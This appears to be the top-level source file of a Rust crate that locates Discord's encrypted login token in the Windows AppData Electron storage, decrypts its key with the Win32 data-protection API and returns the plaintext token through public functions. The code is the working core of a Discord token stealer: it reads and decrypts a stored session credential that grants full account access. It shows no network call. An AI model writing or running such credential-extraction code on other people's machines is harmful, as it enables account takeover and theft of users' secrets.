mod decrypt_token;
mod electron_extract;
mod error;
mod string_key;

pub use error::ExtractDiscordTokenError;
use std::env;
use std::path::Path;

fn get_token_and_key() -> Result<(Vec<u8>, Vec<u8>), ExtractDiscordTokenError> {
    let appdata_path_str = env::var("APPDATA")?;
    let appdata_dir = Path::new(&appdata_path_str);

    let temp_path_str = env::var("TEMP")?;
    let temp_dir = Path::new(&temp_path_str);

    let token = electron_extract::extract_encrypted_token(appdata_dir, temp_dir)?;
    let key =
        decrypt_token::win32_decrypt(&mut electron_extract::extract_encrypted_key(appdata_dir)?)?;

    Ok((token, key))
}

pub fn get_discord_token_as_vec() -> Result<Vec<u8>, ExtractDiscordTokenError> {
    let (mut token_buf, key) = get_token_and_key()?;
    decrypt_token::aead_decrypt_inplace(&mut token_buf, &key)?;
    Ok(token_buf)
}

pub fn get_discord_token() -> Result<String, ExtractDiscordTokenError> {
    let (mut token_buf, key) = get_token_and_key()?;
    let decrypted_token = decrypt_token::aead_decrypt_inplace(&mut token_buf, &key)?;

    Ok(decrypted_token.to_owned())
}
